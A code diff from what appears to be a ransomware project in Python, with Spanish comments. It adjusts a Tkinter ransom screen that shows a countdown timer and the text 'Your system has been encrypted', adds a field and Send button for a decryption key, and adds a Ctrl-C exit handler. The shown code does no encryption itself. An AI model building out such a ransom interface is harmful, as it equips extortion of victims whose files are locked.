@@ -26,7 +26,11 @@ def start_timer(countdown):
         timer_label.config(text="TIME IS UP!")
 
 
+def def_handler(sig, frame):
+    print(colored (f"\n[!] Saliendo...\n", "red"))
+    sys.exit(1)
 
+signal.signal(signal.SIGINT, def_handler)
 
 # frames
 
@@ -51,9 +55,17 @@ label1.image = imageR
 label1.place(relx=0.5, rely=0.5, anchor="center")
 # subtitle
 subtitle = ttk.Label(frame0, text="Your system has been encrypted", font=("sans-serif", 16, "normal"))
-subtitle.place(relx=0.5, rely=0.96, anchor="center")
+subtitle.place(relx=0.5, rely=0.9, anchor="center")
 subtitle.config(foreground='white', background='black')
 
+# key to decode
+
+new_entry = StringVar()
+nuevo_valor_entry = tk.Entry(frame0, textvariable=new_entry, width=70)
+nuevo_valor_entry.place(relx=0.52, rely=1, anchor="center")
+
+insert_key= tk.Label(frame0,text="Insert the key to decrypt all your files", fg="white", bg="black", font=("sans-serif",12 , "normal")).place(relx=0.4, rely=1, anchor="center")
+button_to_send_key = ttk.Button(frame0, text="Send").place(relx=0.7, rely=1, anchor="center")
 
 #frame 1
 ransom_message = """
